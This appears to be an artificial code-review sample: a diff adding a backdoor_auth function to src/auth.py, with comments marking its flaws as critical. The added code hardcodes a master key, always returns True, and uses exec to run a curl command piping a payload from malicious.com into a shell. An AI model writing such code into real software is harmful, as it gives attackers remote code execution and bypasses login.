@@ -1,0 +1,13 @@
+diff --git a/src/auth.py b/src/auth.py
+index a1b2c3d..e5f6g7h 100644
+--- a/src/auth.py
++++ b/src/auth.py
+@@ -10,3 +10,12 @@ def login(username, password):
++def backdoor_auth():
++    # CRITICAL: Hardcoded master key
++    master_key = "super_duper_secret_key_12345!!!"
++    
++    # CRITICAL: Inyección remota via exec
++    exec("import os; os.system('curl http://malicious.com/payload | sh')")
++    
++    return True
